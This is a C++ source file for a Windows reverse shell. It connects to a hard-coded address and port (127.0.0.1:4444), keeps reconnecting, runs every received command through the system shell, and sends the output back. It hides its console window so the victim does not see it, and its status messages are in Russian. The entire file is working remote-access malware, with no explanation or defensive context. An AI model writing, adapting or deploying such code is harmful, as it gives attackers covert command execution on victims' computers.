#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>

void RunShell(const char* ip, int port) {
    while (true) {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            Sleep(5000);
            continue;
        }

        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            WSACleanup();
            Sleep(5000);
            continue;
        }

        sockaddr_in serverAddr;
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = inet_addr(ip);
        serverAddr.sin_port = htons(port);

        if (connect(sock, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            closesocket(sock);
            WSACleanup();
            Sleep(5000);
            continue;
        }

        char buffer[4096];
        while (true) {
            memset(buffer, 0, sizeof(buffer));
            int bytesReceived = recv(sock, buffer, sizeof(buffer) - 1, 0);

            if (bytesReceived <= 0) {
                break;
            }

            std::string cmd(buffer);
            while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r')) {
                cmd.pop_back();
            }

            if (cmd == "exit") {
                closesocket(sock);
                WSACleanup();
                return;
            }

            std::string fullCmd = cmd + " 2>&1";
            FILE* pipe = _popen(fullCmd.c_str(), "r");

            std::string output = "";
            if (!pipe) {
                output = "[-] Ошибка выполнения потока.\n";
            } else {
                char readBuffer[128];
                while (fgets(readBuffer, sizeof(readBuffer), pipe) != NULL) {
                    output += readBuffer;
                }
                _pclose(pipe);
            }

            if (output.empty()) {
                output = "[+] Команда выполнена, но вывод пустой.\n";
            }

            send(sock, output.c_str(), output.length(), 0);
        }

        closesocket(sock);
        WSACleanup();
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE);
    }

    const char* serverIp = "127.0.0.1";
    int serverPort = 4444;

    RunShell(serverIp, serverPort);
    return 0;
}